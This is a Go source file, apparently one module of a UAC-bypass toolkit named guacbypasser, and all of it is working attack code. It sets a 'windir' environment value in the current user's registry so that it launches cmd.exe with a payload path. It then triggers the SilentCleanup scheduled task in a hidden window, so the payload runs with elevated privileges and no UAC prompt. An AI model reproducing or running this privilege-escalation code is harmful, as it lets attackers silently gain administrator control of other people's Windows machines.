package guacbypasser

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func tSilentCleanup(path string) error {
	_ = Reporter{
		Name: "SilentCleanup",
		Desc: "Bypass UAC using silentcleanup and registry key manipulation",
		Id:   9,

		Type:   "Once",
		Module: "tSilentCleanup",

		Fixed:   false,
		FixedIn: "",

		Admin:   false,
		Payload: true,
	}

	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)

	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE); err != nil {
		return err
	}
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Environment`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}
	if err := wk32.SetStringValue("windir", cmdN); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)

	cmd := newCmd("schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if _, err = cmd.exec.Output(); err != nil {
		return err
	}
	return nil
}
